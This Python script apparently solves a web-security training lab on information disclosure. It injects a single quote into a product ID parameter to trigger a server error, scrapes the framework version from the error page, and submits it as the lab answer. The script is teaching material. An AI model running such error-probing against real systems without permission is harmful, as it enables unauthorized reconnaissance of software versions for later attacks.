####################################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 2/9/2023
#
# Lab: Information disclosure in error messages
#
# Steps: 1. Inject a single quote in the product ID parameter to cause an error
#        2. Extract the framework name
#        3. Submit the solution
#
####################################################################################


###########
# imports
###########
import requests
import re
from colorama import Fore


#########
# Main
#########

# change this to your lab URL
url = "https://0adf006704040b2181e3a7ac001100d7.web-security-academy.net"

try:
    # inject the payload
    inject_payload = requests.get(f"{url}/product?productId=4'")  

except:
    print(Fore.RED + "[!] Failed to inject the payload")
    exit(1)
 
# if error occurred
if inject_payload.status_code == 500:  
    print(Fore.WHITE + "1. Injecting the payload.. " + Fore.GREEN + "OK")
    
    # extract the framework name; change this if it's changed in you cases
    framework_name = re.findall("Apache Struts 2 2.3.31", inject_payload.text)[0]  
    
    print(Fore.WHITE + "2. Extracting the framework name.. " + Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + framework_name)
    
    # data to send via POST
    data = {
        "answer": framework_name
    }

    try:
        # submit the solution
        submit_answer = requests.post(f"{url}/submitsolution", data)  

    except:
        print(Fore.RED + "[!] Failed to submit the solution")
        exit(1)

    print(Fore.WHITE + "3. Submitting the solution.. " + Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 Check your browser, it should be marked now as " + Fore.GREEN + "solved")

else:
    print(Fore.RED + "[!] Failed to inject the payload to make an interanl server error")

